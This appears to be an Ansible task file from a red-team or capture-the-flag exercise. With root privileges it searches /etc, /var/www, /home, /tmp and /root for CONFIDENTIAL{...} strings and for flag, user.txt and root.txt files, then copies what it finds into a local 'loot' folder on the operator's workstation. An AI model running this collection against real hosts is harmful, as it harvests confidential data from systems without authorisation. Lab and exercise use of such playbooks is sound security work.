---
- name: Create local loot directory
  delegate_to: localhost
  file:
    path: "{{ playbook_dir }}/loot/{{ inventory_hostname }}"
    state: directory
    mode: '0755'
  become: no

- name: Targeted Flag Extraction
  become: yes
  shell: |
    # 1. Search for CONFIDENTIAL{...} pattern - Escaping braces for extended regex
    # -I skips binaries, -h hides filenames in the middle of strings
    grep -rEIo "CONFIDENTIAL\{[^}]+\}" /etc /var/www /home /tmp /root 2>/dev/null || true

    # 2. Backup: Find text files named 'flag', 'user.txt', or 'root.txt'
    # This catches flags that might not follow the CONFIDENTIAL{} prefix rule
    find /root /home /var/www -maxdepth 4 -size -100k -type f \( -name "*flag*" -o -name "user.txt" -o -name "root.txt" \) \
    ! -path "*.png" ! -path "*.jpg" ! -path "*.gif" ! -path "*.ico" 2>/dev/null | \
    xargs -I {} sh -c 'echo "{}: $(tr -cd "[:print:]" < {} | head -c 100)"' || true
  register: fs_matches
  failed_when: false
  changed_when: false

- name: Save findings to Red Team Workstation
  delegate_to: localhost
  copy:
    content: |
      === TARGETED FLAG REPORT: {{ inventory_hostname }} ===
      
      [DETECTION RESULTS]
      {{ fs_matches.stdout if fs_matches.stdout != "" else "No valid flags found." }}
    dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/flags_report.txt"
  become: no

- name: LIVE FLAG ALERT
  debug:
    msg: 
      - "--- CONFIDENTIAL FLAGS DETECTED ON {{ inventory_hostname }} ---"
      - "{{ fs_matches.stdout_lines if fs_matches.stdout != '' else ['CLEAN: No confidential flags found with curly brace format'] }}"